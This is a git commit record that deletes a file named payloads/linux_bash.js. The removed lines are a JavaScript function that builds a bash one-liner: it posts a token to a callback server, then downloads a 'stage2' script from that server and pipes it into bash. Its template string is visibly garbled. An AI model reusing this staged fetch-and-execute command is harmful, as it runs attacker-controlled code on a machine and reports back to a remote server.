03df7f885465b3171b71332c26db8791a524fd40
Anonymous 🎭 <157519745+anonymous-beta@users.noreply.github.com>
2026-08-02 10:14:02 +0100

    Delete payloads/linux_bash.js

--- payloads/linux_bash.js
+++
@@ -1,6 +0,0 @@
-function generate(token, serverUrl) {
-    // Callback first, then pull + execute stage2
-    return `curl -s -X POST -H 'Content-Type: application/json' -d '{"token":"${token}"}' \( {serverUrl}/api/callback >/dev/null 2>&1; curl -s ' \){serverUrl}/stage2?token=${token}' | bash`;
-}
-
-module.exports = { generate };
